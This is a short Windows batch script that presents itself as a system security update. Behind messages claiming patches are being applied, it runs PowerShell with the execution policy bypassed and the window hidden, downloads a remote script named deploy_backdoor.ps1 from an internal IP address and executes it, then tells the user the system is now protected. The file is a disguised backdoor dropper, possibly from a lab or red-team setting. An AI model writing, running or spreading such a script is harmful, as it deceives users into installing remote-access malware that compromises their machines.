@echo off
echo System Security Update in Progress...
echo Please wait while we apply important security patches.

REM Run the PowerShell script with bypassed execution policy and hidden window
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (New-Object System.Net.WebClient).DownloadString('http://192.168.20.200:8000/deploy_backdoor.ps1')"

echo Update completed successfully.
echo Your system is now protected with the latest security patches.
pause
